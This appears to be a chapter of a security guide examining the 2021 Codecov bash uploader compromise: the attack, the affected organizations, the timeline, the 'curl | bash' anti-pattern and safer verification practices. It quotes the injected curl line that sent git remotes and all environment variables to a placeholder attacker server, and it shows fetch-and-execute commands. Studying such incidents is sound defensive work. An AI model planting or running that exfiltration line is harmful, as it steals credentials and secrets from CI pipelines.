---
title: "Case Study: Codecov Bash Uploader (2021)"
description: "Examine how attackers harvested credentials from thousands of CI/CD pipelines through a modified script fetched via curl."
icon: "lucide/terminal-square"
---

# 7.4 Case Study: Codecov Bash Uploader (2021)

The SolarWinds and 3CX attacks compromised build systems to inject malicious code into distributed software. The Codecov incident demonstrated a different approach: rather than modifying the final product, attackers targeted a script that ran in thousands of CI/CD pipelines, harvesting credentials and secrets from each environment. The attack required no malware installation on end-user systems: the build environments themselves were the target, and the secrets they contained were the prize.

!!! danger "The `curl | bash` Anti-Pattern"

    The modified Codecov script ran in thousands of CI pipelines for two months, exfiltrating credentials from each environment. A single line added to the script collected git remotes and all environment variables, transmitted to attacker-controlled servers.

This attack exemplifies the risks of the `curl | bash` pattern, fetching and executing remote scripts without verification, that remains common in CI/CD configurations despite its obvious security implications.

## Background: Codecov and Code Coverage Reporting

**Codecov** provides code coverage analytics for software development teams. When tests run, they generate coverage data showing which lines of code were executed. Codecov collects this data, aggregates it across branches and pull requests, and provides visibility into testing effectiveness.

The service integrates with CI/CD platforms (GitHub Actions, GitLab CI, CircleCI, Jenkins, and others) through a **bash uploader script**. After tests complete, pipelines execute this script to transmit coverage data to Codecov's servers.

The typical integration looked like:

```shell
# Common pattern in CI configuration files
bash <(curl -s https://codecov.io/bash)
```

This single line would fetch the current version of the uploader script from Codecov's servers and execute it. The script would locate coverage reports, collect metadata about the build, and upload everything to Codecov.

[Codecov claimed][codecov-disclosure] over 29,000 organizations as customers, including many prominent technology companies. Each customer potentially ran the bash uploader in their CI/CD pipelines, often multiple times per day across many repositories.

## The Attack: Modifying the Bash Uploader

On January 31, 2021, attackers gained access to Codecov's systems through a vulnerability in their Docker image creation process. This access allowed them to modify the bash uploader script hosted at `codecov.io/bash`.

The modification was subtle—a single line added to the script:

```shell
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://<attacker-server>/upload/v2
```

This line collected two pieces of information:

1. **Git remote information**: Repository URLs, which often include access tokens or credentials embedded in HTTPS URLs
2. **Environment variables**: The complete set of environment variables present in the build environment

The collected data was transmitted to an attacker-controlled server.

The modification was designed to be inconspicuous:

- The line appeared similar to legitimate curl commands in the script
- It used a short timeout (`-sm 0.5`) to avoid delaying builds
- It failed silently if the attacker's server was unreachable
- The script otherwise functioned normally, uploading coverage data as expected

## The Attack Chain: From CI Environment to Credential Theft

CI/CD environments are treasure troves of credentials. To function, pipelines need access to:

- **Source code repositories**: Git tokens for cloning and pushing
- **Package registries**: npm, PyPI, Docker Hub credentials for publishing
- **Cloud providers**: AWS, GCP, Azure credentials for deployment
- **Secrets management**: API keys, database passwords, service tokens
- **Third-party services**: Notification systems, monitoring tools, other integrations

These credentials are typically provided through environment variables, the exact data the modified script exfiltrated.

The attack chain proceeded as follows:

1. **Organization configures Codecov** in their CI pipeline, fetching the script with `curl | bash`
2. **Build runs normally** but executes the modified uploader script
3. **Script exfiltrates environment variables** to attacker infrastructure
4. **Attackers collect credentials** from thousands of CI environments
5. **Attackers use harvested credentials** to access victim organizations' systems

The beauty of this approach, from an attacker's perspective, was its scalability. Rather than compromising each target organization individually, the attackers positioned themselves at a chokepoint where credentials from thousands of organizations would flow automatically.

## Affected Organizations

The two-month window during which the modified script was active (January 31 - April 1, 2021) affected numerous organizations. Several disclosed their exposure:

**[HashiCorp][hashicorp-disclosure]** announced that their CI environment was impacted. HashiCorp produces widely-used infrastructure tools including Terraform, Vault, and Consul. Their disclosure noted:

> "The impacted CI environment... had access to a GPG signing key used for signing hashes used to validate HashiCorp product releases."

HashiCorp rotated affected credentials, including the GPG key used to sign product releases, a significant operational undertaking.

**[Twilio][twilio-disclosure]** disclosed that the Codecov breach led to unauthorized cloning of some GitHub repositories:

> "A small number of email addresses had likely been exfiltrated by an unknown attacker as a result of this exposure."

Twilio's disclosure indicated that attackers had moved beyond simple credential collection to repository access using exposed tokens.

**Other affected organizations** included:

- **Monday.com**: Notified customers of potential exposure
- **Mercari**: Japanese e-commerce company disclosed impact
- **[Rapid7][rapid7-disclosure]**: Security company disclosed that source code repositories were accessed using credentials obtained through the Codecov breach
- **Various cryptocurrency projects**: Multiple projects reported exposure of signing keys or deployment credentials

The full scope of affected organizations remains unknown. Codecov notified approximately 29,000 customers, but not all disclosed their exposure publicly. Given the types of credentials present in CI environments, the attack likely affected far more organizations than those that publicly acknowledged impact.

## Detection and Response Timeline

!!! note "Two Months Undetected"

    The attack persisted for approximately two months before detection. Detection occurred not through automated security tools but through a customer who happened to verify the script's integrity, a practice that, while recommended, is rarely implemented.

**January 31, 2021**: Attackers modify the Codecov bash uploader script.

**January 31 - April 1, 2021**: The modified script runs in customer CI pipelines, exfiltrating credentials with each execution. Organizations unknowingly transmit secrets to attacker infrastructure.

**April 1, 2021**: A Codecov customer notices a discrepancy in the script's SHA-1 hash compared to expected values. They report the issue to Codecov.

**April 1, 2021**: Codecov confirms the script has been modified, secures their systems, and begins investigation.

**April 15, 2021**: Codecov publicly discloses the breach, recommends all customers rotate credentials that may have been exposed.

**April - May 2021**: Affected organizations begin disclosing their exposure and remediating.

The attack persisted for approximately two months before detection. Detection occurred not through automated security tools but through a customer who happened to verify the script's integrity, a practice that, while recommended, is rarely implemented.

## The `curl | bash` Anti-Pattern

The Codecov attack reignited discussion of the `curl | bash` pattern, piping a remote script directly into a shell for execution.

```shell
# The dangerous pattern
curl -s https://example.com/install.sh | bash

# Also written as
bash <(curl -s https://example.com/install.sh)
```

This pattern is convenient but fundamentally insecure:

**No integrity verification**: You execute whatever the server returns at that moment. If the server is compromised, you execute malicious code.

**HTTPS is insufficient**: TLS verifies you're connecting to the correct server, not that the server's content is safe. A compromised server serves malicious content over a perfectly valid HTTPS connection.

**No review opportunity**: The script executes immediately upon download. You cannot inspect it before execution.

**Time-of-check vs. time-of-use**: Even if you review the script in a browser before running the command, the server could return different content to the curl request.

Despite these risks, `curl | bash` remains prevalent because it is convenient. A single line in documentation can install complex software or configure integrations. The Codecov incident demonstrated the cost of this convenience.

## Secure Alternatives

Organizations should move away from fetching and executing remote scripts without verification:

**Download, verify, then execute:**

```shell
# Download the script
curl -o codecov.sh https://codecov.io/bash

# Verify the checksum
sha256sum codecov.sh
# Compare against known-good checksum

# Execute only after verification
bash codecov.sh
```

**Pin to specific versions with checksums:**

```shell
# Example with explicit version and verification
CODECOV_VERSION="v0.1.0"
CODECOV_SHA256="abc123..."
curl -Os "https://codecov.io/bash-${CODECOV_VERSION}"
echo "${CODECOV_SHA256}  bash-${CODECOV_VERSION}" | sha256sum -c -
bash "bash-${CODECOV_VERSION}"
```

**Use package managers when available:**

```shell
# Install via package manager instead of curl | bash
pip install codecov
codecov
```

**Use vendored copies:**

```shell
# Commit a verified copy of the script to your repository
# Execute the local copy rather than fetching remotely
bash ./scripts/codecov-uploader.sh
```

**Use official binaries with signatures:**

Following the incident, Codecov released a standalone uploader binary with GPG signatures, eliminating the need for bash script execution.

## Broader CI/CD Security Implications

The Codecov incident highlighted systemic risks in CI/CD security:

**Secrets exposure**: CI environments contain extensive credentials, often with broad permissions. These environments are typically less monitored than production systems.

**Third-party integrations**: Modern CI pipelines integrate many external services. Each integration adds potential attack surface.

**Transitive trust**: Organizations trusted Codecov, and through Codecov, trusted whatever script Codecov served. This transitive trust extended to Codecov's security posture.

**Limited visibility**: Many organizations could not easily determine whether they had executed the modified script. CI logs may not have retained sufficient detail.

## Lessons Learned

The Codecov incident provides specific lessons for CI/CD security:

**1. Avoid `curl | bash` patterns in CI pipelines.**

Fetching and executing remote scripts without verification is fundamentally insecure. Use vendored scripts, package managers, or verified downloads instead.

**2. Treat CI environments as sensitive infrastructure.**

CI/CD systems have extensive access to credentials and systems. They deserve security investment proportional to their risk.

**3. Minimize secrets in CI environments.**

Provide only the credentials necessary for each job. Use short-lived tokens rather than long-lived credentials. Limit credential scope to specific operations.

**4. Monitor for credential misuse.**

Even with compromised credentials, detection is possible if you monitor for anomalous use. Watch for unusual access patterns, unexpected IP addresses, or operations outside normal build activities.

**5. Implement secrets scanning in CI output.**

CI logs should be scanned for accidentally exposed secrets. Tools like `git-secrets`, `trufflehog`, and CI platform features can detect exposed credentials.

**6. Verify integrity of external scripts and tools.**

When external scripts or binaries must be used, verify checksums or signatures before execution. Pin to specific versions rather than fetching "latest."

**7. Conduct supply chain inventory for CI/CD.**

Document all third-party services and scripts integrated into your pipelines. Assess the security implications of each integration.

**8. Have credential rotation procedures ready.**

When incidents occur, rapid credential rotation limits attacker opportunity. Organizations without prepared procedures faced longer exposure windows.

The Codecov attack demonstrated that supply chain compromise does not require modifying distributed software. By targeting the build process itself, attackers accessed credentials that unlocked far more than any single piece of software could provide. This pivot from compromising products to compromising processes represents an evolution in supply chain attack tactics: one that organizations must address through CI/CD security investments.

[codecov-disclosure]: https://about.codecov.io/security-update/
[hashicorp-disclosure]: https://discuss.hashicorp.com/t/hcsec-2021-12-codecov-security-event-and-hashicorp-gpg-key-exposure/23512
[twilio-disclosure]: https://www.twilio.com/en-us/blog/company/communications/response-to-the-codecov-vulnerability
[rapid7-disclosure]: https://www.rapid7.com/blog/post/2021/05/13/rapid7s-response-to-codecov-incident/
